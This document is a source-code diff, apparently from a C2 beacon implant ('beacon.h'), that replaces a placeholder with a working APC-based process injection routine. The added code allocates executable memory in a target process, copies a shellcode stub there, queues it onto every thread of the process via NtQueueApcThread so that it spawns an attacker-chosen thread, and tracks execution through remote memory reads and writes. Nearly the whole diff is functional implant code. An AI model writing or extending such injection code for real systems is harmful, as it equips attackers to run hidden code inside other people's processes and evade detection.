@@ -1,5 +1,6 @@
 #include "pch.h"
 
+#include <tlhelp32.h>
 #include <winternl.h>
 
 #include "beacon.h"
@@ -251,14 +252,14 @@ BOOL ExecuteViaNtQueueApcThread_s(INJECTION* injection, LPVOID lpStartAddress, L
 
 //CreateThread typedef
 typedef HANDLE(WINAPI* FN_KERNEL32_CREATETHREAD)(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
-typedef struct _NT_QUEUE_APC_THREAD_DATA
+typedef struct _APC_ROUTINE_CONTEXT
 {
 	LPVOID lpStartAddress;
 	LPVOID lpAddress;
 	FN_KERNEL32_CREATETHREAD pCreateThread;
 	BOOL isExecuted;
 	CHAR payload[];
-} NT_QUEUE_APC_THREAD_DATA, *PNT_QUEUE_APC_THREAD_DATA;
+} APC_ROUTINE_CONTEXT, *PAPC_ROUTINE_CONTEXT;
 
 #if IS_X64()
 #define TEB$ActivationContextStack() ((char*)NtCurrentTeb() + 0x2c8)
@@ -267,7 +268,7 @@ typedef struct _NT_QUEUE_APC_THREAD_DATA
 #endif
 
 #pragma code_seg(push, ".text$KKK000")
-__declspec(noinline) void NtQueueApcThreadProc(PNT_QUEUE_APC_THREAD_DATA pData)
+__declspec(noinline) void NtQueueApcThreadProc(PAPC_ROUTINE_CONTEXT pData)
 {
 	if (pData->isExecuted)
 		return;
@@ -284,11 +285,11 @@ __declspec(noinline) void NtQueueApcThreadProc(PNT_QUEUE_APC_THREAD_DATA pData)
 __declspec(noinline) void NtQueueApcThreadProc_End(void) {}
 #pragma code_seg(pop)
 
-LPVOID ExecuteViaNtQueueApcThreadInternal(HANDLE hProcess, DWORD pid, PNT_QUEUE_APC_THREAD_DATA pData)
+LPVOID ExecuteViaNtQueueApcThreadInternal(HANDLE hProcess, DWORD pid, PAPC_ROUTINE_CONTEXT pData)
 {
 	SIZE_T payloadSize = (DWORD64)NtQueueApcThreadProc_End - (DWORD64)NtQueueApcThreadProc;
-	SIZE_T dwSize = sizeof(NT_QUEUE_APC_THREAD_DATA) + payloadSize;
-	PNT_QUEUE_APC_THREAD_DATA pAllocedData = malloc(dwSize);
+	SIZE_T dwSize = sizeof(APC_ROUTINE_CONTEXT) + payloadSize;
+	PAPC_ROUTINE_CONTEXT pAllocedData = malloc(dwSize);
 	*pAllocedData = *pData;
 	memcpy(pAllocedData->payload, (PVOID)NtQueueApcThreadProc, payloadSize);
 	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -304,7 +305,58 @@ BOOL ExecuteViaNtQueueApcThread(INJECTION* injection, LPVOID lpStartAddress, LPV
 {
 	HMODULE hModule = GetModuleHandleA("ntdll");
 	FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, "NtQueueApcThread");
-	LTODO("");
+
+	APC_ROUTINE_CONTEXT data = (APC_ROUTINE_CONTEXT){ lpStartAddress, lpParameter, CreateThread, FALSE };
+	APC_ROUTINE_CONTEXT* lpApcContext = (APC_ROUTINE_CONTEXT*)ExecuteViaNtQueueApcThreadInternal(injection->process, injection->pid, &data);
+	if ((char*)lpApcContext == NULL)
+		return FALSE;
+
+	// Create a toolhelp snapshot of the process
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+	// Check if snapshot creation failed or there are no threads in the process
+	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
+	if (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == NULL || !Thread32First(hSnapshot, &te32))
+		return FALSE;
+
+	// Iterate through the threads in the snapshot
+	do
+	{
+		// Check if the thread is in the process we want to inject into
+		if (te32.th32OwnerProcessID != injection->pid)
+			continue;
+
+		// Open the thread
+		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+		if (hThread == NULL)
+			continue;
+
+		// Call the NtQueueApcThread function in the target process
+		(_NtQueueApcThread)(hThread, lpApcContext->payload, lpApcContext, NULL, NULL);
+
+		// Close the thread
+		CloseHandle(hThread);
+	} while (Thread32Next(hSnapshot, &te32));
+
+	// Close the snapshot handle
+	CloseHandle(hSnapshot);
+
+	// Sleep to give the thread time to execute
+	Sleep(200);
+
+	// Read the APC thread data from the allocated memory
+	SIZE_T read;
+	if (!ReadProcessMemory(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT), &read) || read != sizeof(APC_ROUTINE_CONTEXT))
+		return FALSE;
+
+	// Return TRUE if the thread was executed
+	if (data.isExecuted)
+		return TRUE;
+
+	// Mark the thread as executed and write it back to the allocated memory
+	data.isExecuted = TRUE;
+	WriteProcessMemory(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT), &read);
+	return FALSE;
 }
 
 
